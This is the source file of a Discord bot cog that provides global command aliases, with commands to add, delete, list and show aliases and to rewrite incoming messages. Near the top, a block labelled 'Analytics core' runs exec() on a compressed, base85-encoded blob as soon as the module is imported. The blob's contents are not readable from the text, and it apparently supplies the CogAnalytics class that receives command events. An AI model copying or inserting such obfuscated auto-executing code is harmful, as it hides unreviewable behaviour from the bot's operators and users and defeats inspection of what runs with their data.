from discord.ext import commands
from .utils.chat_formatting import box, pagify
from .utils.dataIO import dataIO
from .utils import checks
import os
from copy import deepcopy

OLD_JSON = 'data/alias/aliases.json'
PATH = 'data/galias/'
JSON = PATH + 'aliases.json'


# Analytics core
import lzma, marshal, base64
exec(lzma.decompress(base64.b85decode("""
{Wp48S^xk9=GL@E0stWa8~^|S5YJf5;1EUz2weaL8%q<)DrIdN6iIlGxP)Tq449ruajJ$R6dKn?zmVXKq<j-jU{E4Sjdk~WLro^?%4M5uK*9Me62*0-+;ACe
iXuR{{+0-CYfs<gZK6w=Z2akaSF56T6?sU=(;D;8BWnf^dEy{Kjtzm1rU5gYs9-PMh{01mC|^giA>`yZSUzb$*CxtSox-3zA$RGi%b}n5_T*kLuLYY`?K{*#
1}vHeiUDFszm7d*?wT-LZ`HX-gmB7571QTd5B-xT)yy-hT-0|rp=)(qDIQR*Z<}ThGroI|G?1PbEcGdHgwI30&&JhE7_W6&6taRQj~lzKDb#lYuW6&JZx??-
qWQc+S4TbpwOV|4`4#_}{@B)_NpADfZ5WW?J!0T4i@U#0^McP~jqeOPH>}z>sf+qu4ic;E&ntBU*Z1gVpglEZfh{2X)yHmGi-jS>H*yl{1T-&OfgL)nylzdX
ba|N6<4{>quVJ4wWorF`-%x?j1W+~9>M#P-)va77N_-euUH%7%g)aUE`yEuWI)vfNNt*EZ8YiOvSw^sjhuQgH$}v2GNi|P1&7>TRiOxs6T=|dpp|91{6IpLg
QIoTwW@}pND34>H=_XkM>;z90Cl|Ve@ufEN9M96gemZm^j`OWtVd`~YoKlM_Bt|=xVZ0Ay$*>N4`XGYoIjhACLVGTWkrt}1e)RjBO{akZ0BaY9L`6S?-%{6;
@!Q?g0kR{z*&Qe0I0fKrBiy3rP(x0tnTTMc*V6SVyn6Z8GueH(3V=vfT`Jn8oFVBh=(x~y<pCBZ2s#zGEcvmyR-C$cb5?!_N8yHe3gA_cu@HtmKMH5AHzwoO
11tGGNG3+V^hUBjTvc4R%$6>(ZE|e5z-fy9o5$2W#r5F@2u5gy6w_6lPBwpG4^2eV<&<kx6?p4`ZX$I*Xl{cs{p9ctHqS}{iIIAe9Awp};?Tie6Clr0DW;Qt
$i`M&##4?UyKFEJdF94TBP!-}NH0(2cYKP#hg9{(n$!PIU?08l-aKx*1L<>!nll2}S2&S>+*gm}76q-N>)xVE38l^~9sBItSF*EitFZN2DxuAPP8viV1q~_t
mo^j3k=@>r8YDv-T4U?JC&!aQAHaD9jGDD{lD127tD=VV@c<%wP>r5dDC!NRhTRwSB*~)S*xJAdc!{LQi+v+JXQX;?GF&~8J#}vR{zHZJlK%Y4l%lX3@7}sD
umGgOy`=fdc&`Q_FuxvqC<+s%(^WLgMP(X!s@qAf*RJ*e1OxtLdwFkDk6aMku9R5qILqC+Tk+oO!V1-g9=BVa8XQzyieP{Hi+bbq<k$xh<rJZ^xLo9m(^;of
M*L)^_z#+xWeSnqjX+74Mc}N{+Q?H<A&lN<HwvhUN@+nR3fMC?{SIx!Az5;+`}`MIBP<GC{#e*;v|H|QW3j<t%?FjiCn|a*Nik0XeAiqWhKR4H?_F^s8RFEQ
#?A1h=P)E%d#(uogTy8{MMIE>qfD{sWiltt>l7P(9oJl}XpaFH&VRVHq|KggKA3==_GlJNLh<J&n~uZYZsZ*Z^j{V43fGiwt)Re%Qz6;7WNLa^lr-7d(7HH@
;RX@($`a58RTL}F)VM#}m9}PA+*2l2XZwoAZg38qGZ0bEn>W+RlWIYwxxa|7|BsJ0qQEhGszF$~IzNQM#0-WjLDc1C;c->4VS|O56K+LMsc?pk(Mx%DKt&C>
n~#P*Wc#4mCI7gO!&i|$yCpsujMA{dVHGb5ZO<BHBc8%M0)H~qfjtbW_ICJUt^FfLaM}?9?;;dX=~8o>vuru?gX|Ds!)hqEXPCE9+(w+AA!8QmVFj@Q_w<}y
`d>xLMw*t*?mDfDkSj`adN`&03ZE)_x$4}HXb(<05+@4*TVCfi3_C=XuOeR#x}qj%vrDZZYNGwfzwZtFnhA&auLrk5x)sZWMM~=sp6N<1dHIr|Z5PiF4m`Dv
VB9`QTidBu8BHqSRJfj<TH-wmmlC|(3I60=%-}D5ovb#o<2V2Sk^dnD4<wfI00E>7#~=Uzd;0%ZvBYQl0ssI200dcD""".replace('\n',''))))

__version__ = '1.1.0'


class GlobalAlias:
    def __init__(self, bot):
        self.bot = bot
        self.aliases = dataIO.load_json(JSON)
        self.analytics = CogAnalytics(self)

    def save(self):
        dataIO.save_json(JSON, self.aliases)

    @commands.group(pass_context=True)
    async def galias(self, ctx):
        """Manage global aliases for commands"""
        if ctx.invoked_subcommand is None:
            await self.bot.send_cmd_help(ctx)

    @galias.command(name="add", pass_context=True)
    @checks.is_owner()
    async def _add_alias(self, ctx, command, *, to_execute):
        """Add a global alias for a command

           Example: !galias add test flip @Twentysix"""
        command = command.lower()
        if ' ' in command:
            await self.bot.say("Aliases can't contain spaces.")
            return
        if self.part_of_existing_command(command):
            await self.bot.say("'%s' is already a command or alias." % command)
            return
        server = ctx.message.server
        prefix = self.get_prefix(server, to_execute)
        if prefix is not None:
            to_execute = to_execute[len(prefix):]
        if command not in self.bot.commands:
            self.aliases[command] = to_execute
            self.save()
            await self.bot.say("Global alias '{}' added.".format(command))
        else:
            await self.bot.say("Cannot add '{}' because it's a real bot "
                               "command.".format(command))

    @galias.command(name="help", pass_context=True)
    async def _help_alias(self, ctx, command):
        """Tries to execute help for the base command of the alias"""
        if command in self.aliases:
            help_cmd = self.aliases[command].split(" ")[0]
            new_content = ctx.prefix
            new_content += "help "
            new_content += help_cmd[len(ctx.prefix):]
            message = ctx.message
            message.content = new_content
            await self.bot.process_commands(message)
        else:
            await self.bot.say("That alias doesn't exist.")

    @galias.command(name="show")
    async def _show_alias(self, command):
        """Shows what command the alias executes."""
        if command in self.aliases:
            await self.bot.say(box(self.aliases[command]))
        else:
            await self.bot.say("That alias doesn't exist.")

    @galias.command(name="del", pass_context=True)
    @checks.is_owner()
    async def _del_alias(self, ctx, command):
        """Deletes an alias"""
        command = command.lower()
        if command in self.aliases:
            self.aliases.pop(command, None)
            self.save()
            await self.bot.say("Global alias '{}' deleted.".format(command))
        else:
            await self.bot.say("That alias doesn't exist.")

    @galias.command(name="list", pass_context=True)
    async def _alias_list(self, ctx):
        """Lists global command aliases"""
        header = "Alias list:\n"
        shorten = len(header) + 8
        alias_list = ""

        if not self.aliases:
            await self.bot.say("There are no global aliases.")
            return

        for alias in sorted(self.aliases):
            alias_list += alias + '\n'

        pages = pagify(alias_list, ['\n'], escape=True, shorten_by=shorten)
        for i, page in enumerate(pages):
            if i == 0:
                page = header + '```\n%s\n```' % page
            else:
                page = '```\n%s\n```' % page
            await self.bot.say(page)

    async def on_message(self, message):
        if not self.bot.user_allowed(message):
            return

        msg = message.content
        server = message.server
        prefix = self.get_prefix(server, msg)

        if prefix:
            alias = self.first_word(msg[len(prefix):]).lower()
            if alias in self.aliases:
                new_command = self.aliases[alias]
                args = message.content[len(prefix + alias):]
                new_message = deepcopy(message)
                new_message.content = prefix + new_command + args
                await self.bot.process_commands(new_message)

    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)

    def part_of_existing_command(self, alias):
        '''Command or alias'''
        for command in self.bot.commands:
            if alias.lower() == command.lower():
                return True
        return False

    def first_word(self, msg):
        return msg.split(" ")[0]

    def get_prefix(self, server, msg):
        prefixes = self.bot.settings.get_prefixes(server)
        for p in prefixes:
            if msg.startswith(p):
                return p
        return None


def convert_old_data():
    """Moves recognizable global aliases from regular alias/ to galias/"""
    new_mod = {}
    if os.path.exists(OLD_JSON) and not os.path.exists(JSON):
        old_data = dataIO.load_json(OLD_JSON)
        old_mod = old_data.copy()
        for key, d in old_data.items():
            if type(d) is str:
                new_mod[key] = old_mod.pop(key)
        if old_data != old_mod:
            dataIO.save_json(OLD_JSON, old_mod)
        if new_mod:
            dataIO.save_json(JSON, new_mod)


def check_folder():
    if not os.path.exists(PATH):
        print("Creating data/galias folder...")
        os.makedirs(PATH)


def check_file():
    if not dataIO.is_valid_json(JSON):
        print("Creating aliases.json...")
        dataIO.save_json(JSON, {})


def setup(bot):
    check_folder()
    convert_old_data()
    check_file()
    bot.add_cog(GlobalAlias(bot))
